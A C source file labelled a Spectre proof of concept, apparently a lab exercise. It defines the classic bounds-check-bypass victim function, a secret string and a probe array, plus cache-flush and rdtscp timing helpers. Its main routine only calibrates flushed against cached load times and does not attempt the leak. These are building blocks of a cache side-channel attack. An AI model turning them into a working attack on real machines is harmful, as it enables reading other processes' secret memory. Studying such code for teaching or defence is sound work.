/*********************************************************************
*
* Spectre PoC
*
**********************************************************************/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "fcntl.h"
#include "sched.h"
#include "pthread.h"
#include "unistd.h"
#include "inttypes.h"

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
        1,
        2,
        3,
        4,
        5,
        6,
        7,
        8,
        9,
        10,
        11,
        12,
        13,
        14,
        15,
        16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "abcdefghijklmnopq.";

uint8_t temp = 0;


void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}


/********************************************************************
Analysis code
********************************************************************/


/*
 * the code for flushing an address from cache to memory
 * the input is a pointer
 */
static inline void flush(void *addr) {
    asm volatile("clflush 0(%0)": : "r" (addr):);
}


/*
 * the code for loading an address and timing the load
 * the output of this function is the time in CPU cycles
 * the input is a pointer
 */
static inline uint32_t memaccesstime(void *v) {
    uint32_t rv;
    asm volatile("mfence\n"
                 "lfence\n"
                 "rdtscp\n"
                 "mov %%eax, %%esi\n"
                 "mov (%1), %%eax\n"
                 "rdtscp\n"
                 "sub %%esi, %%eax\n"
    : "=&a"(rv)
    : "r"(v)
    : "ecx", "edx", "esi");
    return rv;
}


int main() {
    int a[1000];
    for (int i = 0; i < 1000; i++)
        a[i] = i;

    /*
     * in each iteration, flush, wait, and then reload and time the reload
     */
    for (int i = 0; i < 1000; i++) {
        flush(&(a[i]));
        sched_yield();// wait for a while
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        int time = memaccesstime(&(a[i]));

        printf("flushed %d\n", time);

    }

    /*
     * in each iteration, wait, and then reload and time the reload
     */
    for (int i = 0; i < 1000; i++) {
        sched_yield();// wait for a while
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        sched_yield();
        int time = memaccesstime(&(a[i]));

        printf("did not flush %d\n", time);

    }
}
